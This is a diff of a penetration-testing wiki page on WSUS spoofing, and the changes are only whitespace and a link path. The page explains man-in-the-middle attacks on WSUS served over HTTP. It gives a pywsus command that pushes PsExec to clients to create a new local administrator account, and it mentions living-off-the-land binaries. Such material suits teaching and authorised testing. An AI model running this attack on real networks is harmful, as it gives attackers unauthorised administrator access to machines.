@@ -6,8 +6,6 @@ WSUS (Windows Server Update Services) allow administrators to centralize the man
 
 When pulling an update from the WSUS server, clients are redirected to the executable file to download and execute (which can only be a binary signed by Microsoft) and obtain a handler named `CommandLineInstallation` that specifies the additional parameters to pass the binary during the update installation. Without HTTPS, the WSUS is vulnerable to Man-in-the-Middle attacks where adversaries can either pose as the update server and send malicious updates or intercept and modify updates sent to the clients.
 
-
-
 ## Practice
 
 The following command prints the WSUS server the client requests when searching for an update. If the path looks like `http://wsus.domain.local/`, showing the use of HTTP instead of HTTPS, the attacks can be attempted.
@@ -36,7 +34,7 @@ The evil WSUS server needs to be started before doing any ARP poisoning. The [py
 python3 pywsus.py --host $network_facing_ip --port 8530 --executable /path/to/PsExec64.exe --command '/accepteula /s cmd.exe /c "net user testuser somepassword /add && net localgroup Administrators testuser /add"'
 ```
 
-Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](../../../systems-and-services/privilege-escalation/windows/living-off-the-land.md) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io/#).
+Programs other than PsExec.exe can be used here. Using built-in programs features to bypass security restrictions or operate attacks like this is called [Living off the land](../../../sys/privilege-escalation/windows/living-off-the-land.md) (LOL). Other Windows LOL binaries and scripts (a.k.a. LOLbins or LOLbas) can be found on [lolbas-project.github.io](https://lolbas-project.github.io/#).
 
 ### Poisoning and hijacking
 
